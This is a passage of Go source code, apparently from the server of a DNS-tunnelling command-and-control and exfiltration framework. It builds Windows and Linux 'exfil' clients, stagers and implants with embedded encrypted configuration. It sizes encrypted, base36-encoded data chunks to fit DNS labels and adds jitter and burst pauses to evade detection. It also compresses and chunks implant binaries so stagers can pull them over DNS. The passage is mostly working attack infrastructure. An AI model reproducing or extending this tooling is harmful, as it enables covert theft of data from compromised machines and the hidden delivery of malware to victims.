	chunk_retry_delay_ms: default_chunk_retry_delay_ms(),
	use_txt_records: %t,
	max_subdomain_length: %d,
	encrypted: %t,
});

`,
		formatRustStringLiteral(encryptionKey),
		formatRustStringSlice(req.Domains),
		formatRustStringSlice(req.Resolvers),
		formatRustStringSlice(serverIPs),
		req.ChunkBytes,
		req.JitterMinMs,
		req.JitterMaxMs,
		req.ChunksPerBurst,
		req.BurstPauseMs,
		req.UseTxtRecords,
		req.MaxSubdomainLength,
		exfilEncrypted,
	)

	content := string(data)
	startMarker := "static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {"
	startIdx := strings.Index(content, startMarker)
	if startIdx == -1 {
		return fmt.Errorf("unable to locate embedded config block in config.rs")
	}

	endIdx := strings.Index(content[startIdx:], "});")
	if endIdx == -1 {
		return fmt.Errorf("unable to locate end of embedded config block")
	}
	endIdx += startIdx + len("});")

	updated := content[:startIdx] + replacement + content[endIdx:]

	return os.WriteFile(configPath, []byte(updated), 0644)
}

func formatRustStringSlice(values []string) string {
	clean := filterEmpty(values)
	if len(clean) == 0 {
		return "vec![]"
	}

	literals := make([]string, 0, len(clean))
	for _, value := range clean {
		literals = append(literals, fmt.Sprintf("\"%s\".to_string()", formatRustStringLiteral(value)))
	}

	return fmt.Sprintf("vec![%s]", strings.Join(literals, ", "))
}

func formatRustStringLiteral(value string) string {
	replaced := strings.ReplaceAll(value, "\\", "\\\\")
	replaced = strings.ReplaceAll(replaced, "\"", "\\\"")
	replaced = strings.ReplaceAll(replaced, "\n", "\\n")
	return replaced
}

func filterEmpty(values []string) []string {
	var filtered []string
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed != "" {
			filtered = append(filtered, trimmed)
		}
	}
	return filtered
}

func collectActiveDomains(servers []map[string]interface{}) []string {
	seen := make(map[string]struct{})
	var domains []string
	for _, server := range servers {
		status, _ := server["status"].(string)
		if status != "active" {
			continue
		}
		if domain, ok := server["domain"].(string); ok {
			domain = strings.TrimSpace(domain)
			if domain == "" {
				continue
			}
			if _, exists := seen[domain]; exists {
				continue
			}
			seen[domain] = struct{}{}
			domains = append(domains, domain)
		}
	}
	return domains
}

func collectServerAddresses(servers []map[string]interface{}) []string {
	seen := make(map[string]struct{})
	var ips []string
	for _, server := range servers {
		// Collect addresses from all servers, not just active ones
		// This ensures the exfil client can ACK responses from any registered server
		if addr, ok := server["address"].(string); ok {
			addr = strings.TrimSpace(addr)
			if addr == "" {
				continue
			}
			if _, exists := seen[addr]; exists {
				continue
			}
			seen[addr] = struct{}{}
			ips = append(ips, addr)
		}
	}
	return ips
}

const (
	dnsMaxName           = 253
	dataLabelSplit       = 62
	aesGCMOverhead       = 28
	maxChunkProbe        = 512
	sessionTagLen        = 3
	metadataLabelPrefix  = "EX"
	envelopePlaintextLen = 1 + 1 + sessionTagLen + 4 // version + flags + tag + counter
)

var log36Of2 = math.Log(2) / math.Log(36)

func clampExfilChunkBytes(req *ExfilClientBuildRequest) (before int, limit int) {
	const (
		defaultChunk = 180
		minChunk     = 64
		maxChunk     = 220
	)

	before = req.ChunkBytes
	if req.ChunkBytes <= 0 {
		req.ChunkBytes = defaultChunk
	}

	limit = maxChunkBytesForDomains(req.Domains, req.MaxSubdomainLength)
	if limit > 0 && req.ChunkBytes > limit {
		req.ChunkBytes = limit
	}

	if req.ChunkBytes > maxChunk {
		req.ChunkBytes = maxChunk
	}

	if (limit == 0 || limit >= minChunk) && req.ChunkBytes < minChunk {
		req.ChunkBytes = minChunk
	}

	if req.ChunkBytes < 1 {
		req.ChunkBytes = 1
	}

	return before, limit
}

func maxChunkBytesForDomains(domains []string, maxSubdomainLen int) int {
	longest := longestDomainLength(domains)
	if longest == 0 {
		return 0
	}

	best := 0
	for chunk := 1; chunk <= maxChunkProbe; chunk++ {
		if chunkFitsBudget(chunk, longest, maxSubdomainLen) {
			best = chunk
		} else {
			break
		}
	}
	return best
}

func longestDomainLength(domains []string) int {
	longest := 0
	for _, domain := range domains {
		trimmed := strings.TrimSpace(domain)
		trimmed = strings.TrimSuffix(trimmed, ".")
		if l := len(trimmed); l > longest {
			longest = l
		}
	}
	return longest
}

func chunkFitsBudget(chunkBytes, domainLen, maxSubdomainLen int) bool {
	if chunkBytes <= 0 || domainLen <= 0 {
		return false
	}
	encodedLen := encodedLenForPayload(chunkBytes)
	labelCount := 1 + labelCountForEncoded(encodedLen)
	totalLen := domainLen + metadataLabelLen() + encodedLen + labelCount

	if totalLen > dnsMaxName {
		return false
	}

	// If max subdomain length is set, enforce it
	if maxSubdomainLen > 0 {
		subdomainLen := metadataLabelLen() + encodedLen + labelCount
		if subdomainLen > maxSubdomainLen {
			return false
		}
	}

	return true
}

func encodedLenForPayload(bytes int) int {
	cipherLen := bytes + aesGCMOverhead
	return estimateBase36Len(cipherLen)
}

func metadataLabelLen() int {
	cipherLen := envelopePlaintextLen + aesGCMOverhead
	return len(metadataLabelPrefix) + estimateBase36Len(cipherLen)
}

func labelCountForEncoded(encodedLen int) int {
	if encodedLen <= 0 {
		return 1
	}
	return (encodedLen + dataLabelSplit - 1) / dataLabelSplit
}

func estimateBase36Len(bytes int) int {
	if bytes <= 0 {
		return 1
	}
	bits := float64((bytes + 1) * 8) // +1 for 0x01 sentinel byte prepended by base36 encoder
	return int(math.Ceil(bits * log36Of2))
}

// validatePayloadFormat checks that a PayloadFormat string is usable with the given domains.
// A PayloadFormat is a subdomain template where X marks encoded-data positions and non-X,
// non-dot characters are literal decorators. Returns nil if valid, error if not.
func validatePayloadFormat(format string, domains []string) error {
	if format == "" {
		return nil
	}

	// 1. All characters must be X, dot, or DNS-safe decorator chars (a-z, 0-9, hyphen, underscore)
	for i, ch := range format {
		if ch == 'X' || ch == '.' {
			continue
		}
		if (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') ||
			(ch >= '0' && ch <= '9') || ch == '-' || ch == '_' {
			continue
		}
		return fmt.Errorf("invalid character %q at position %d (allowed: X . a-z A-Z 0-9 - _)", ch, i)
	}

	// 2. No individual DNS label (segment between dots) may exceed 63 characters
	for i, label := range strings.Split(format, ".") {
		if len(label) == 0 {
			return fmt.Errorf("format has empty label at segment %d (consecutive or leading dots)", i)
		}
		if len(label) > 63 {
			return fmt.Errorf("format label %d is %d characters, exceeds DNS max of 63", i, len(label))
		}
	}

	// 3. Format + domain must fit in 253-char FQDN.
	// FQDN = {formatted_payload}.{domain}  (timestamp is encoded inside the payload, not a separate label)
	for _, domain := range domains {
		fqdnLen := len(format) + 1 + len(domain)
		if fqdnLen > dnsMaxName {
			return fmt.Errorf("format (%d chars) + domain '%s' (%d chars) = %d-char FQDN, exceeds DNS max 253",
				len(format), domain, len(domain), fqdnLen)
		}
	}

	return nil
}

func selectServerAddress(servers []map[string]interface{}) string {
	pick := func(activeOnly bool) string {
		for _, server := range servers {
			if activeOnly {
				if status, ok := server["status"].(string); !ok || status != "active" {
					continue
				}
			}
			if addr, ok := server["address"].(string); ok {
				addr = strings.TrimSpace(addr)
				if addr != "" {
					return addr
				}
			}
		}
		return ""
	}

	if addr := pick(true); addr != "" {
		return addr
	}
	return pick(false)
}

type rustTargetConfig struct {
	platform     string
	arch         string
	triple       string
	linker       string
	requiredHost string
}

// rustTargetMatrixStatic uses musl for static linking - works on any glibc version
var rustTargetMatrixStatic = map[string]map[string]rustTargetConfig{
	"linux": {
		"amd64":  {platform: "linux", arch: "amd64", triple: "x86_64-unknown-linux-musl"},
		"x86_64": {platform: "linux", arch: "x86_64", triple: "x86_64-unknown-linux-musl"},
		"386":    {platform: "linux", arch: "386", triple: "i686-unknown-linux-musl"},
		"arm64":  {platform: "linux", arch: "arm64", triple: "aarch64-unknown-linux-musl"},
		"armv7l": {platform: "linux", arch: "armv7l", triple: "armv7-unknown-linux-musleabihf"},
		"arm":    {platform: "linux", arch: "arm", triple: "arm-unknown-linux-musleabihf"},
	},
	"windows": {
		"amd64":  {platform: "windows", arch: "amd64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
		"x86_64": {platform: "windows", arch: "x86_64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
		"386":    {platform: "windows", arch: "386", triple: "i686-pc-windows-gnu", linker: "i686-w64-mingw32-gcc"},
		"arm64":  {platform: "windows", arch: "arm64", triple: "aarch64-pc-windows-msvc", requiredHost: "windows"},
		"armv7l": {platform: "windows", arch: "armv7l", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
		"arm":    {platform: "windows", arch: "arm", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
	},
}

// rustTargetMatrixDynamic uses glibc for dynamic linking - smaller binaries but requires compatible glibc
var rustTargetMatrixDynamic = map[string]map[string]rustTargetConfig{
	"linux": {
		"amd64":  {platform: "linux", arch: "amd64"},
		"x86_64": {platform: "linux", arch: "x86_64"},
		"386":    {platform: "linux", arch: "386", triple: "i686-unknown-linux-gnu", linker: "i686-linux-gnu-gcc"},
		"arm64":  {platform: "linux", arch: "arm64", triple: "aarch64-unknown-linux-gnu", linker: "aarch64-linux-gnu-gcc"},
		"armv7l": {platform: "linux", arch: "armv7l", triple: "armv7-unknown-linux-gnueabihf", linker: "arm-linux-gnueabihf-gcc"},
		"arm":    {platform: "linux", arch: "arm", triple: "arm-unknown-linux-gnueabihf", linker: "arm-linux-gnueabihf-gcc"},
	},
	"windows": {
		"amd64":  {platform: "windows", arch: "amd64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
		"x86_64": {platform: "windows", arch: "x86_64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
		"386":    {platform: "windows", arch: "386", triple: "i686-pc-windows-gnu", linker: "i686-w64-mingw32-gcc"},
		"arm64":  {platform: "windows", arch: "arm64", triple: "aarch64-pc-windows-msvc", requiredHost: "windows"},
		"armv7l": {platform: "windows", arch: "armv7l", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
		"arm":    {platform: "windows", arch: "arm", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
	},
}

func resolveRustTargetConfig(platform, arch string, staticLink bool) (rustTargetConfig, error) {
	platform = strings.ToLower(platform)
	arch = strings.ToLower(arch)

	// Select the appropriate target matrix based on static linking preference
	var targetMatrix map[string]map[string]rustTargetConfig
	if staticLink {
		targetMatrix = rustTargetMatrixStatic
	} else {
		targetMatrix = rustTargetMatrixDynamic
	}

	configs, ok := targetMatrix[platform]
	if !ok {
		return rustTargetConfig{}, fmt.Errorf("unsupported platform: %s", platform)
	}
	cfg, ok := configs[arch]
	if !ok {
		return rustTargetConfig{}, fmt.Errorf("unsupported architecture %s for platform %s", arch, platform)
	}
	return cfg, nil
}

func ensureExfilBuildDependencies(cfg rustTargetConfig) error {
	if _, err := resolveCargoBinary(); err != nil {
		return err
	}

	if cfg.requiredHost != "" && runtime.GOOS != cfg.requiredHost {
		return fmt.Errorf("%s/%s builds must run on a %s host (current host: %s)", cfg.platform, cfg.arch, cfg.requiredHost, runtime.GOOS)
	}

	if cfg.triple != "" {
		if err := ensureRustTargetInstalled(cfg.triple); err != nil {
			return err
		}
	}

	if cfg.linker != "" {
		if _, err := exec.LookPath(cfg.linker); err != nil {
			return fmt.Errorf("required cross linker %s not found. Install the matching cross-compiler toolchain (e.g., apt install %s)", cfg.linker, cfg.linker)
		}
	}

	return nil
}

func ensureRustTargetInstalled(target string) error {
	if target == "" {
		return nil
	}
	rustupPath, err := resolveRustupBinary()
	if err != nil {
		return err
	}

	cmd := exec.Command(rustupPath, "target", "list", "--installed")
	cmd.Env = os.Environ()
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to query installed rust targets: %w", err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.TrimSpace(line) == target {
			return nil
		}
	}

	return fmt.Errorf("rust target %s is not installed. Install it with: rustup target add %s", target, target)
}

func writeCargoConfig(buildDir string, cfg rustTargetConfig) error {
	if cfg.triple == "" || cfg.linker == "" {
		return nil
	}

	cargoDir := filepath.Join(buildDir, ".cargo")
	if err := os.MkdirAll(cargoDir, 0755); err != nil {
		return fmt.Errorf("failed to create cargo config directory: %w", err)
	}

	configPath := filepath.Join(cargoDir, "config.toml")
	content := fmt.Sprintf("[target.%s]\nlinker = \"%s\"\n", cfg.triple, cfg.linker)
	return os.WriteFile(configPath, []byte(content), 0644)
}

// saveBuildLog persists build output to the builds directory so operators can retrieve it
// alongside successful builds. Returns the saved log path.
func (api *APIServer) saveBuildLog(buildType, buildID string, output []byte, buildErr error) string {
	typeDir := filepath.Join(buildsDir, buildType)
	if err := os.MkdirAll(typeDir, 0755); err != nil {
		fmt.Printf("[Builder] Failed to create log directory %s: %v\n", typeDir, err)
		return ""
	}

	if buildID == "" {
		buildID = fmt.Sprintf("unknown-%d", time.Now().Unix())
	}
	logFilename := fmt.Sprintf("build-failed-%s-%d.log", buildID, time.Now().Unix())
	logPath := filepath.Join(typeDir, logFilename)

	var buf bytes.Buffer
	buf.WriteString(fmt.Sprintf("Build failed at %s\n", time.Now().UTC().Format(time.RFC3339)))
	buf.WriteString(fmt.Sprintf("Type: %s\n", buildType))
	buf.WriteString(fmt.Sprintf("Build ID: %s\n", buildID))
	if buildErr != nil {
		buf.WriteString(fmt.Sprintf("Error: %v\n", buildErr))
	}
	buf.WriteString("\n--- Build Output ---\n")
	buf.Write(output)

	if err := os.WriteFile(logPath, buf.Bytes(), 0644); err != nil {
		fmt.Printf("[Builder] Failed to write build log %s: %v\n", logPath, err)
		return ""
	}
	fmt.Printf("[Builder] Build failure log saved to: %s\n", logPath)
	return logPath
}

// saveBuild saves a compiled binary to the builds directory and persists optional metadata
func (api *APIServer) saveBuild(sourcePath, filename, buildType string, metadata *BuildMetadata) (string, error) {
	// Ensure builds directory exists
	typeDir := filepath.Join(buildsDir, buildType)
	if err := os.MkdirAll(typeDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create builds directory: %w", err)
	}

	// Copy binary to builds directory
	destPath := filepath.Join(typeDir, filename)
	if err := copyFile(sourcePath, destPath); err != nil {
		return "", fmt.Errorf("failed to copy binary: %w", err)
	}

	if err := writeBuildMetadata(destPath, metadata); err != nil {
		fmt.Printf("Warning: failed to write metadata for %s: %v\n", filename, err)
	}

	return destPath, nil
}

func relativeBuildPath(path string) string {
	if path == "" {
		return ""
	}
	if rel, err := filepath.Rel(buildsDir, path); err == nil {
		return rel
	}
	return path
}

func newBuildArtifact(buildType, filename, savedPath string) (*BuildArtifact, error) {
	info, err := os.Stat(savedPath)
	if err != nil {
		return nil, err
	}
	return &BuildArtifact{
		Filename:     filename,
		Type:         buildType,
		Size:         info.Size(),
		DownloadPath: relativeBuildPath(savedPath),
	}, nil
}

func writeBuildMetadata(destPath string, metadata *BuildMetadata) error {
	if metadata == nil {
		return nil
	}
	payload, err := json.MarshalIndent(metadata, "", "  ")
	if err != nil {
		return err
	}
	metaPath := destPath + ".meta.json"
	return os.WriteFile(metaPath, payload, 0644)
}

func loadBuildMetadata(fullPath string) *BuildMetadata {
	metaPath := fullPath + ".meta.json"
	data, err := os.ReadFile(metaPath)
	if err != nil {
		if !os.IsNotExist(err) {
			fmt.Printf("Warning: failed to read metadata for %s: %v\n", metaPath, err)
		}
		return nil
	}

	var meta BuildMetadata
	if err := json.Unmarshal(data, &meta); err != nil {
		fmt.Printf("Warning: failed to parse metadata for %s: %v\n", metaPath, err)
		return nil
	}
	return &meta
}

func formatTimingRange(prefix string, minVal, maxVal int, unit string) string {
	if minVal <= 0 && maxVal <= 0 {
		return ""
	}

	switch {
	case minVal > 0 && maxVal > 0:
		if minVal == maxVal {
			if unit == "" {
				return fmt.Sprintf("%s %d", prefix, minVal)
			}
			return fmt.Sprintf("%s %d %s", prefix, minVal, unit)
		}
		if unit == "" {
			return fmt.Sprintf("%s %d-%d", prefix, minVal, maxVal)
		}
		return fmt.Sprintf("%s %d-%d %s", prefix, minVal, maxVal, unit)
	case minVal > 0:
		if unit == "" {
			return fmt.Sprintf("%s %d", prefix, minVal)
		}
		return fmt.Sprintf("%s %d %s", prefix, minVal, unit)
	default:
		if unit == "" {
			return fmt.Sprintf("%s %d", prefix, maxVal)
		}
		return fmt.Sprintf("%s %d %s", prefix, maxVal, unit)
	}
}

func formatBuildTiming(buildType string, meta *BuildMetadata) string {
	if meta == nil || meta.Timing == nil {
		return ""
	}

	t := meta.Timing
	var parts []string

	switch buildType {
	case "client":
		if label := formatTimingRange("Sleep", t.SleepMinSec, t.SleepMaxSec, "s"); label != "" {
			parts = append(parts, label)
		}
		if label := formatTimingRange("Exfil jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
			parts = append(parts, label)
		}
	case "stager":
		if label := formatTimingRange("Jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
			parts = append(parts, label)
		}
	case "exfil":
		if t.ChunkBytes > 0 {
			parts = append(parts, fmt.Sprintf("%d-byte chunks", t.ChunkBytes))
		}
		if label := formatTimingRange("Jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
			parts = append(parts, label)
		}
	}

	if t.ChunksPerBurst > 0 {
		parts = append(parts, fmt.Sprintf("%d chunks/burst", t.ChunksPerBurst))
	}
	if t.BurstPauseMs > 0 {
		parts = append(parts, fmt.Sprintf("pause %d ms", t.BurstPauseMs))
	}

	return strings.Join(parts, " · ")
}

// storeClientBinaryForStager compresses, encodes, chunks, and stores client binary for stager deployment
func (api *APIServer) storeClientBinaryForStager(binaryPath, filename string, req ClientBuildRequest, savedPath, buildID, buildConfigJSON string) error {
	// Read binary file
	clientData, err := os.ReadFile(binaryPath)
	if err != nil {
		return fmt.Errorf("failed to read binary: %w", err)
	}

	originalSize := len(clientData)

	// Compress with gzip
	var compressedBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&compressedBuf)
	if _, err := gzWriter.Write(clientData); err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}
	gzWriter.Close()

	compressed := compressedBuf.Bytes()
	compressedSize := len(compressed)

	// Base64 encode
	base64Data := base64.StdEncoding.EncodeToString(compressed)
	base64Size := len(base64Data)

	// Calculate chunks (DNS-safe size)
	const chunkSize = 370
	totalChunks := (base64Size + chunkSize - 1) / chunkSize

	// Join DNS domains
	dnsDomains := strings.Join(req.DNSDomains, ",")

	// Generate ID
	binaryID := fmt.Sprintf("client_%d", time.Now().UnixNano())

	err = api.db.SaveClientBinary(
		binaryID,
		filename,
		req.Platform,
		req.Architecture,
		"",
		base64Data,
		dnsDomains,
		originalSize,
		compressedSize,
		base64Size,
		chunkSize,
		totalChunks,
		"",
		buildID,
		buildConfigJSON,
	)

	if err != nil {
		return fmt.Errorf("failed to save to database: %w", err)
	}

	fmt.Printf("[Builder] Client binary stored for stager: %s (%d bytes -> %d chunks)\n",
		binaryID, originalSize, totalChunks)

	return nil
}

// BuildTimingMetadata captures timing-centric options recorded with a build artifact
type BuildTimingMetadata struct {
	SleepMinSec    int `json:"sleep_min_sec,omitempty"`
	SleepMaxSec    int `json:"sleep_max_sec,omitempty"`
	JitterMinMs    int `json:"jitter_min_ms,omitempty"`
	JitterMaxMs    int `json:"jitter_max_ms,omitempty"`
	ChunksPerBurst int `json:"chunks_per_burst,omitempty"`
	BurstPauseMs   int `json:"burst_pause_ms,omitempty"`
	ChunkBytes     int `json:"chunk_bytes,omitempty"`
}

// BuildMetadata stores supplemental context for saved builds
type BuildMetadata struct {
	Platform     string               `json:"platform,omitempty"`
	Architecture string               `json:"architecture,omitempty"`
	Domains      []string             `json:"domains,omitempty"`
	BuildID      string               `json:"build_id,omitempty"`
	Timing       *BuildTimingMetadata `json:"timing,omitempty"`
}

// Build represents a saved build
type Build struct {
	Name      string         `json:"name"`
	Type      string         `json:"type"`
	Size      int64          `json:"size"`
	Timestamp time.Time      `json:"timestamp"`
	Path      string         `json:"path"`
	Timing    string         `json:"timing,omitempty"`
	Metadata  *BuildMetadata `json:"metadata,omitempty"`
}

type BuildArtifact struct {
	Filename     string `json:"filename"`
	Type         string `json:"type"`
	Size         int64  `json:"size"`
	DownloadPath string `json:"download_path"`
	BuildID      string `json:"build_id,omitempty"`
}

// handleListBuilds returns a list of all saved builds
func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	builds := []Build{}

	// Walk through builds directory
	buildTypes := []string{"dns-server", "client", "stager", "exfil"}
	for _, buildType := range buildTypes {
		typeDir := filepath.Join(buildsDir, buildType)

		entries, err := os.ReadDir(typeDir)
		if err != nil {
			if !os.IsNotExist(err) {
				fmt.Printf("Warning: failed to read %s directory: %v\n", buildType, err)
			}
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() || strings.HasSuffix(entry.Name(), ".json") {
				continue
			}

			info, err := entry.Info()
			if err != nil {
				continue
			}

			fullPath := filepath.Join(typeDir, entry.Name())
			build := Build{
				Name:      entry.Name(),
				Type:      buildType,
				Size:      info.Size(),
				Timestamp: info.ModTime(),
				Path:      filepath.Join(buildType, entry.Name()),
			}

			if meta := loadBuildMetadata(fullPath); meta != nil {
				build.Metadata = meta
				if timing := formatBuildTiming(buildType, meta); timing != "" {
					build.Timing = timing
				}
			}

			builds = append(builds, build)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builds)
}

// handleListExfilClientBuilds returns metadata about recent exfil client builds
func (api *APIServer) handleListExfilClientBuilds(w http.ResponseWriter, r *http.Request) {
	builds, err := api.db.ListExfilClientBuilds(100)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to load exfil builds")
		return
	}

	for _, build := range builds {
		pathVal, _ := build["file_path"].(string)
		if pathVal == "" {
			build["download_path"] = ""
			continue
		}

		if _, err := os.Stat(pathVal); err != nil {
			if os.IsNotExist(err) {
				build["download_path"] = ""
				continue
			}
		}

		if rel, err := filepath.Rel(buildsDir, pathVal); err == nil {
			build["download_path"] = rel
		} else {
			build["download_path"] = pathVal
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builds)
}

// handleDownloadBuild downloads a previously saved build
func (api *APIServer) handleDownloadBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Check if file exists
	info, err := os.Stat(fullPath)
	if err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, "failed to access build")
		return
	}

	if info.IsDir() {
		api.sendError(w, http.StatusBadRequest, "path is a directory")
		return
	}

	// Send file
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(buildPath)))
	http.ServeFile(w, r, fullPath)
}

// handleDeleteBuild deletes a saved build
func (api *APIServer) handleDeleteBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Delete file
	if err := os.Remove(fullPath); err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to delete build: %v", err))
		return
	}
	os.Remove(fullPath + ".meta.json")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}

func isValidDomain(domain string) bool {
	if len(domain) == 0 || len(domain) > 253 {
		return false
	}
	labels := strings.Split(domain, ".")
	if len(labels) < 2 {
		return false
	}
	for _, label := range labels {
		if len(label) == 0 || len(label) > 63 {
			return false
		}
		for _, c := range label {
			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-') {
				return false
			}
		}
		if label[0] == '-' || label[len(label)-1] == '-' {
			return false
		}
	}
	return true
}
